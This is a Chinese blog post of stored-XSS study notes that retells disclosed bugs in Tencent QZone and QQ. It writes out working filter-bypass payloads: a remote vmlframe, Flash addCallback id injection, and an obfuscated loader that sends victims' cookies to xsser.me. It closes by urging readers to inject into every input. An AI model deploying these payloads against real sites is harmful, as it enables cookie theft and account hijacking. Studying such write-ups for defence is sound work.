+<h2 id="19-存储型XSS入门-什么都没过滤的情况"><a href="#19-存储型XSS入门-什么都没过滤的情况" class="headerlink" title="19. 存储型XSS入门 [什么都没过滤的情况]"></a>19. 存储型XSS入门 [什么都没过滤的情况]</h2><blockquote>
+<p>存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说：</p>
+<p>反射型是：输入–输出；</p>
+<p>存储型是：输入–进入数据库*–取出数据库–输出。</p>
+<p>这样一来，大家应该注意到以下差别：</p>
+<p>反射型是：绝大部分情况下，输入在哪里，输出就在哪里。</p>
+<p>存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</p>
+<p>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型</p>
+<p>存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中</p>
+<p>因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型XSS。</p>
+<p>至于如何根据输出来构建存储型XSS的代码，和反射型没有任何区别，都是看输出的上下文来进行.</p>
+<p>从程序员过滤代码的角度来讲，我们给之后的教程走向分个类：</p>
+<ol>
+<li><p>数据需要过滤，但是未过滤。导致XSS.</p>
+<p> 比如：昵称、个人资料。</p>
+</li>
+<li><p>业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致XSS。</p>
+<p> 比如：日志、邮件及其它富文本应用。<br>本节先看一个最基本的情况，该过滤，但是什么都没过滤的情况。</p>
+</li>
+</ol>
+<p>（数据库：不一定是像mysql那样的数据库，只要是能存储数据的都算。）</p>
+<p>找存储型的时候，需要有一颗多疑的心，一双善于发现的眼睛。我们来看看实例！</p>
+<p><img src="19-0.webp" alt=""></p>
+<p>这个时候，我们就会想，这个发上来的页面会不会有XSS呢？</p>
+<p>我们来看看页面的结构。</p>
+<p><img src="19-1.webp" alt=""></p>
+<p>很多新手在找XSS的时候，都是拿着<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>或者其它到处测试，很盲目不是吗？</p>
+<p>一定要记住本节最开头的话，存储型XSS，输出的位置不一定出现在输入的位置。</p>
+<p>因而我们有时候需要逆向的思维，来寻找存储型XSS。 大概思路如下：</p>
+<p>先找到输出点，然后猜测此处输出是否会被过滤。</p>
+<p>如果觉得可能没过滤，我们再找到这个输出是在哪里输入的。</p>
+<p>接着开始测试输入，看输出的效果。</p>
+<p>如果没过滤，那么你就成功了，否则你可以放弃掉它。</p>
+<p>拿本例来说明以上过程，</p>
+<p>我们猜测昵称这个输出没过滤。</p>
+<p>找到输入点，这个输入点，就是修改QQ昵称。</p>
+<p>开始测试</p>
+<p>通过WEBQQ修改昵称如下：(方法见： <a href="http://www.wooyun.org/bugs/wooyun-2012-013563" target="_blank" rel="external">WooYun: PKAV腾讯专场 - 3. 腾讯QQ客户端某处功能页面存储型XSS</a> )</p>
+<p>使用charles web proxy 拦截WEBQQ数据包，修改并提交。</p>
+<p><img src="19-2.webp" alt=""></p>
+<p>提交成功后：</p>
+<p><img src="19-3.webp" alt=""></p>
+<p>我们拿小号进入一个群，发布一条手机QQ的语音。看输出效果，没过滤，成功了吧～～</p>
+<p><img src="19-4.webp" alt=""></p>
+<p><img src="19-5.webp" alt=""></p>
+<p>拿xsser.me在某群的测试效果！</p>
+<p><img src="19-6.webp" alt=""></p>
+</blockquote>
+<h2 id="20-存储型XSS入门-套现绕过富文本"><a href="#20-存储型XSS入门-套现绕过富文本" class="headerlink" title="20. 存储型XSS入门 [套现绕过富文本]"></a>20. 存储型XSS入门 [套现绕过富文本]</h2><blockquote>
+<p>很多应用含有富文本内容，这类应用最典型的特征是具有编辑器，例如：博客日志，邮箱等。这类应用往往允许使用一定的HTML代码。为了在用户体验和安全之间寻找平衡，各种厂商可能采用了不尽相同的办法。但是总体来说，有2类。</p>
+<p>第1类我们称为白名单，即：只允许使用白名单内的合法HTML标签，例如IMG。其它均剔除。例如：百度贴吧回帖时候的代码过滤方式。</p>
+<p>第2类我们称为黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分。 如：QQ邮箱的发邮件时的过滤方式。</p>
+<p>白名单要安全得多，而黑名单的方式则经常会被绕过。</p>
+<p>绕过的技巧也有很多，我们可以从最没技术含量的开始说起!! 本节将以QQ空间/QQ校友的日志功能为例来说明，什么是“套现绕过富文本”！</p>
+<p>注意：本节说的“套现”，不是与“钱”有关的；在这里的含义是：“套用现成的XSS代码”。</p>
+<p>新手平时测试XSS时，经常会用到<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>到处插入，看效果。</p>
+<p>这种做法，在某些反射型XSS，或者你运气好的时候，确实能碰到。但是如果拿到QQ空间日志里去插入。嗯，后果一定会很悲壮，被过滤的毛都没有了。。</p>
+<p> 这是为什么呢？因为<code>&lt;script&gt;</code>在腾讯的黑名单中，被过滤是理所当然的。</p>
+<p>试想，如果我们找到一个不在腾讯黑名单中的XSS代码，岂不是就可以成功在日志里执行XSS了么？</p>
+<p>有的人会问了。。哪里去找啊?? 方法有2种：</p>
+<ul>
+<li>你足够牛，自己去发现。</li>
+<li>已经有大牛为我们准备了很好的资料，去里面翻。@sogili 维护的 <code>http://html5sec.org/</code></li>
+</ul>
+<p><img src="20-0.webp" alt=""> </p>
+<p>然后我就开始按照下面的流程慢慢测试。</p>
+<p>先进QQ空间，发表一个日志，然后编辑日志，同时抓包。</p>
+<p><img src="20-1.webp" alt=""></p>
+<p>修改抓包内容后，这里修改的是日志内容。提交修改后的数据包！</p>
+<p>然后我们来看看日志里的源代码里，我们提交的XSS代码是否被过滤。</p>
+<p><img src="20-2.webp" alt=""></p>
+<p>这里我们就不说失败的了，直接说成功的部分。</p>
+<p>我们提交以下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;vmlframe xmlns=&quot;urn:schemas-microsoft-com:vml&quot; style=&quot;behavior:url(#default#vml);position:absolute;width:100%;height:100%&quot; src=&quot;http://itsokla.duapp.com/shouzi.vml#xss&quot;&gt;&lt;/vmlframe&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>然后看看源代码的输出：</p>
+<p><img src="20-3.webp" alt=""></p>
+<p>可以看到，这个XSS代码完全没过滤。</p>
+<p>我们可以看到XSS的效果。鼠标移到日志上，即会触发XSS代码。</p>
+<p><img src="20-4.webp" alt=""></p>
+<p>很简单，对吧？ 但是有以下问题我们要注意！！</p>
+<ol>
+<li>使用代码前，先自己在本地试下，是否能执行！搞清楚你所使用的XSS代码的原理是什么！</li>
+<li>搞清楚XSS代码的适用范围：如：在什么浏览器的什么版本之下才能使用，是否需要用户交互等。</li>
+<li>注意平时对此类代码的搜集与整理。</li>
+</ol>
+</blockquote>
+<h2 id="21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS"><a href="#21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS" class="headerlink" title="21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]"></a>21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]</h2><blockquote>
+<p>有些时候，我们拿现成的XSS代码都不行，都被过滤了，那么需要我们对过滤的规则进行一定的判断与猜测。然后针对性的使用一些技巧来适应或者绕过规则。</p>
+<p>在本例中，我们以QQ空间/QQ校友的日志功能为例，通过猜测简单的过滤规则，然后使用含有addCallback的flash，来实现了存储型XSS的构造。</p>
+<p>前提：本例需在IE9，IE10下进行。</p>
+<p>我们乌云上报告的一些已有案例，进行了再次测试。</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2012-013721" target="_blank" rel="external">WooYun: PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS</a></p>
+<p>上例中，提到了QQ空间日志并未对object标签进行有效的过滤。</p>
+<p>我们根据此例中的代码对过滤规则进行测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>以上的代码，是可以正常提交，并且未过滤的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://mysite.com/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://mysite.com/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>而当swf的域名不是qzs.qq.com时候，代码将会被过滤为以下内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>即地址被去掉了。</p>
+<p>那么我们已知了这个过滤规则， 就有2种绕过的方式。</p>
+<p>找到一个qzs.qq.com域名下存在缺陷的FLASH，然后加以利用。</p>
+<p>此方法，已经在 @gainover 的 <a href="http://www.wooyun.org/bugs/wooyun-2012-013721" target="_blank" rel="external">WooYun: PKAV腾讯专场 - 6. （QQ空间+朋友网）日志功能存储型XSS</a> 有所介绍了。</p>
+<p>利用Flash的addcallback缺陷来构造存储型XSS。</p>
+<p>首先说下flash addcallback方法的基本原理。</p>
+<p>根据flash sdk 里的源代码，我们可以得到flash addcallback 的源代码中有以下代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; if ((((activeX == true)) &amp;&amp; (!((objectID == null)))))&#123;</div><div class="line">	_evalJS(((((&quot;__flash__addCallback(document.getElementById(\&quot;&quot; + objectID) + &quot;\&quot;), \&quot;&quot;) + functionName) + &quot;\&quot;);&quot;));</div><div class="line">&#125;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="21-0.webp" alt=""></p>
+<p>其中objectID为调用FLASH的HTML标签的ID。functionName则为被JS所调用的函数名称。</p>
+<p>当我们有以下代码时：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;object id=&quot;aaaa&quot; width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>且<code>http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf</code> 中存在一句<code>ExternalInterface.addCallback(&quot;myfunc&quot;,funcInFlash);</code>, 则有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; objectID=&quot;aaaa&quot;;</div><div class="line">functionName=&quot;myfunc&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>代入上面那句_evalJS中，则有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; __flash__addCallback(document.getElementById(&quot;aaaa&quot;), &quot;myfunc&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p> 那么我们可以想象一下，如果 aaaa 替换为 <code>aaaa&quot;),alert(1),(&quot;</code></p>
+<p>则上面代码变为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; __flash__addCallback(document.getElementById(&quot;aaaa&quot;),alert(1),(&quot;&quot;), &quot;myfunc&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>解析</p>
+<p><img src="21-1.webp" alt=""></p>
+<p>且FLASH中，确实未对objectID做任何过滤。 基于以上内容，我们可以构建利用代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;object id=&apos;aaaa&quot;),alert(1),(&quot;&apos; width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们自己用上面这段代码先在自己网站上测试下：</p>
+<p><img src="21-2.webp" alt=""></p>
+<p>看，果然id里的代码被执行了！</p>
+<p>利用以上原理，接着我们在QQ空间里来做测试，至于FLASH么，就是现成的！</p>
+<p>虽然这个FLASH里没有缺陷，但是存在addCallback的调用，我们就可以直接用它。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;object width=&quot;100%&quot; height=&quot;100%&quot; align=&quot;middle&quot; id=&quot;xsstest1&amp;quot),(function()&#123;if(!window.__x)&#123;window.__x=1;window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,101,114,46,109,101,47,66,113,112,57,82,121);document.body.appendChild(window.s);&#125;&#125;)(),(&amp;quot;&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; type=&quot;application/x-shockwave-flash&quot;&gt;&lt;PARAM NAME=&quot;Movie&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;Src&quot; VALUE=&quot;http://qzs.qq.com/qzone/client/photo/swf/vphoto.swf&quot;&gt;&lt;PARAM NAME=&quot;AllowScriptAccess&quot; VALUE=&quot;always&quot;&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>发布日志，使用以上代码</p>
+<p><img src="21-3.webp" alt=""></p>
+<p>当用户访问含有XSS代码的日志后，我们可以在xsser.me查看所记录的cookies内容。</p>
+<p><img src="21-4.webp" alt=""></p>
+<p>仅IE9, 10 受影响。QQ空间/校友同时受影响。</p>
+</blockquote>
+<p>反正……见框就插叭，广撒网，总能捡着洞的……</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>窝很可爱，请给窝钱</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>赞赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Cytosine 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Cytosine 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Sec/" rel="tag"># Sec</a>
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/30/reverse-shell-simple/" rel="next" title="浅述反弹shell">
+                <i class="fa fa-chevron-left"></i> 浅述反弹shell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/08/note-xss-0-xinshangdeshouzi-cases/" rel="prev" title="[XSS笔记]乌云白帽子心伤的瘦子-21个鹅厂XSS案例">
+                [XSS笔记]乌云白帽子心伤的瘦子-21个鹅厂XSS案例 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.webp"
+                alt="Cytosine" />
+            
+              <p class="site-author-name" itemprop="name">Cytosine</p>
+              <p class="site-description motion-element" itemprop="description">悟已往之不谏，知来者之可追。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/Lovegood" target="_blank" title="GitHub">
+                    GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/CytosineLovegood/activities" target="_blank" title="知乎">
+                    知乎</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://zhuanlan.zhihu.com/dashijian" target="_blank" title="安全大事件">
+                    安全大事件</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://xuptsec.github.io/" target="_blank" title="XUPTSEC-blog">
+                    XUPTSEC-blog</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                from dalao import
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pcat.cnblogs.com/" title="pcat" target="_blank">pcat</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://flygon.net/" title="飞龙" target="_blank">飞龙</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ju5tw4nty0u.top/" title="ju5tw4nty0u" target="_blank">ju5tw4nty0u</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://darkwing.moe/" title="暗羽" target="_blank">暗羽</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://webdog.ml/" title="grt1st" target="_blank">grt1st</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.k0rz3n.com/" title="K0rz3n" target="_blank">K0rz3n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lovei.org/" title="腹黑" target="_blank">腹黑</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://sec2hack.com/" title="Wfox" target="_blank">Wfox</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.codemonster.cn/" title="Xishir" target="_blank">Xishir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://eternalsakura13.com/" title="Sakura" target="_blank">Sakura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://math1as.com/" title="Math1as" target="_blank">Math1as</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.thecosmos.cn/" title="Cosmos" target="_blank">Cosmos</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影" target="_blank">奈沙夜影</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/PeterZ1997/" title="PeterZ" target="_blank">PeterZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.changwei.me/" title="昌维" target="_blank">昌维</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://white.xmutsec.com" title="White" target="_blank">White</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cismon.net/" title="CismonX" target="_blank">CismonX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lsafe.org/" title="lixin" target="_blank">lixin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wzsite.cn/" title="Wz" target="_blank">Wz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.blogsir.com.cn/" title="江sir" target="_blank">江sir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://greyd0g.github.io/" title="greyd0g" target="_blank">greyd0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brucetg.github.io/" title="Brucetg" target="_blank">Brucetg</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.get1t.cn/" title="FraMeQ" target="_blank">FraMeQ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.smallflower.xin/" title="小花" target="_blank">小花</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://iosmosis.github.io/" title="iosmosis" target="_blank">iosmosis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://processor.pub/" title="Processor" target="_blank">Processor</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lmxspace.com/" title="l1nk3r" target="_blank">l1nk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.evi1s.com/index.php/links.html" title="Map1e" target="_blank">Map1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pvp.im/" title="清枫" target="_blank">清枫</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.itfire.cn/" title="仓鼠" target="_blank">仓鼠</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sk15.net/" title="一苇" target="_blank">一苇</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.t1h2ua.cn/" title="T1h2ua" target="_blank">T1h2ua</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#反射型XSS"><span class="nav-number">1.</span> <span class="nav-text">反射型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-什么都没过滤的入门情况"><span class="nav-number">1.1.</span> <span class="nav-text">1.什么都没过滤的入门情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-输出在-lt-script-gt-lt-script-gt-之间"><span class="nav-number">1.2.</span> <span class="nav-text">2.输出在<script></script>之间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-输出在HTML属性里的情况"><span class="nav-number">1.3.</span> <span class="nav-text">3.输出在HTML属性里的情况</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一种场景："><span class="nav-number">1.3.1.</span> <span class="nav-text">第一种场景：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二种场景"><span class="nav-number">1.3.2.</span> <span class="nav-text">第二种场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-宽字节复仇记-QQ邮箱基本通用"><span class="nav-number">1.4.</span> <span class="nav-text">4. 宽字节复仇记 [QQ邮箱基本通用]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-反斜线复仇记"><span class="nav-number">1.5.</span> <span class="nav-text">5. 反斜线复仇记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-换行符复仇记"><span class="nav-number">1.6.</span> <span class="nav-text">6. 换行符复仇记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-宽字节、反斜线与换行符一起复仇记"><span class="nav-number">1.7.</span> <span class="nav-text">7. 宽字节、反斜线与换行符一起复仇记</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOM-XSS"><span class="nav-number">2.</span> <span class="nav-text">DOM XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-Dom-Xss入门-显式输出"><span class="nav-number">2.1.</span> <span class="nav-text">8. Dom Xss入门 [显式输出]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-Dom-Xss入门-隐式输出"><span class="nav-number">2.2.</span> <span class="nav-text">9. Dom Xss入门 [隐式输出]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#先看1的情况。看到步骤5里面的那个图。我们可以构造以下代码。"><span class="nav-number">2.2.1.</span> <span class="nav-text">先看1的情况。看到步骤5里面的那个图。我们可以构造以下代码。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再来看看-2-的方法"><span class="nav-number">2.2.2.</span> <span class="nav-text">再来看看 2 的方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-Dom-Xss进阶-邂逅eval"><span class="nav-number">2.3.</span> <span class="nav-text">10. Dom Xss进阶 [邂逅eval]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方案"><span class="nav-number">2.3.1.</span> <span class="nav-text">修复方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-Dom-Xss进阶-善变iframe"><span class="nav-number">2.4.</span> <span class="nav-text">11. Dom Xss进阶 [善变iframe]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#先来说说iframe的变化。"><span class="nav-number">2.4.1.</span> <span class="nav-text">先来说说iframe的变化。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体例子"><span class="nav-number">2.4.2.</span> <span class="nav-text">具体例子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-Dom-Xss进阶-路径con"><span class="nav-number">2.5.</span> <span class="nav-text">12. Dom Xss进阶 [路径con]</span></a></li><li class="nav-item 